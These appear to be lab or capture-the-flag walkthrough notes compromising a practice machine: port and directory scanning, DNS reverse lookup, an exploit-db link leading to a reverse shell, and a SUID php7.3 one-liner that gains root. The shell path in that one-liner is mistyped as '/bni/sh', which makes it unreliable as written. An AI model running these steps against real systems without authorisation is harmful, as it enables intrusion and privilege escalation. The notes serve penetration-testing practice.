```bash
nmap -T4 -p- -Pn -A 192.168.57.10
```
- results
```
Nmap scan report for 192.168.57.10
Host is up (0.0040s latency).
Not shown: 9997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
- dns on 53
- default nginx on 80
	-  Webmaster: alek@blackpearl.tcm in src

dirbusting
```bash
dirb http://192.168.57.10 -r                                                                                                                                                                                                       
URL_BASE: http://192.168.57.10/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------
GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.57.10/ ----
+ http://192.168.57.10/secret (CODE:200|SIZE:209)                                                                                                 
```
- secret file
```txt
OMG you got r00t !

Just kidding... search somewhere else. Directory busting won't give anything.
<This message is here so that you don't waste more time directory busting this particular website.>

- Alek 
```

- dns
```bash

dnsrecon -r 127.0.0.0/24 -n 192.168.57.10 -d blank 
-d needed but content unimportant

[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
[+] 	 PTR blackpearl.tcm 127.0.0.1
[+] 1 Records Found
```
- add to /etc/hosts
- url gives phpinfo

- dirbusting / fuzzing the url
	- /navigate 
	- login page
	- search exploits
		- https://www.exploit-db.com/exploits/45561`
- gets rev shell

- use linpeas for privesc
	- SUID : 's' in owners 
	- SGID : 's' in group 
	- Sticky Bit : 's' in others
- SUID allows running as owner privs
	- https://gtfobins.github.io/#+suid
	- php7.3
	```bash
	/usr/bin/php7.3 -r "pcntl_exec('/bni/sh', ['-p']);"
	id
	# uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
	# see euid=0(root)
	```
- root access